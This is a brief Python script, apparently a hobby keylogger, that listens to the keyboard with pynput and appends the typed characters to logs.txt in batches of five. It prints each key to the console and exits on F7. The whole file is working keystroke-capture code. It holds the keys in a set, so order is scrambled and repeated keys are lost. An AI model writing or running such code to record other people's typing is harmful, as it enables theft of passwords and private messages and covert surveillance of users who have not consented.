from pynput import keyboard

word_counts = 0
keys = set()


def write_file(key_arr):
    with open("logs.txt", "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")
            if ke.find("space") > 0:
                f.write('\n')
            if ke.find("Key") == -1:
                f.write(ke)


def on_press(key):
    global word_counts, keys
    keys.add(key)
    word_counts += 1
    print(f'{key} pressed')
    if word_counts >= 5:
        word_counts = 0
        write_file(keys)
        keys = set()


def on_release(key):
    if key == keyboard.Key.f7:
        print("Bye ... :)")
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
